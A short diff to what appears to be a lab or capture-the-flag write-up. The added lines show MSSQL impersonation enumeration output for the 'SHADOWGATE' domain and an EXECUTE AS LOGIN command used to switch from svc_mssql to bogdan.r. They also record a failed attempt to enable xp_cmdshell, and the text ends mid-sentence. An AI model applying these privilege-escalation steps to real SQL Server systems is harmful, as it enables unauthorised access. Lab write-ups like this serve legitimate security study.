@@ -505,8 +505,14 @@ I cannot enabled xp_cmdshell
 There isnt anything in the databases
 
 ```python
-
+SQL (SHADOWGATE\svc_mssql  guest@master)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee                grantor               
+----------   --------   ---------------   ----------   --------------------   -------------------   
+b'LOGIN'     b''        IMPERSONATE       GRANT        SHADOWGATE\svc_mssql   SHADOWGATE\bogdan.r   
+SQL (SHADOWGATE\svc_mssql  guest@master)>
 ```
+
+I can impersonate the `bogdan.r` user
 
 ```python
 SQL (SHADOWGATE\svc_mssql  guest@master)> EXECUTE AS LOGIN = 'SHADOWGATE\bogdan.r';
@@ -514,6 +520,8 @@ SQL (SHADOWGATE\bogdan.r  guest@master)>
 ```
 
 I am able to impersonate the `bogdan.r` user, but this has no more access than the last user.
+
+But i could try some
 
 
 
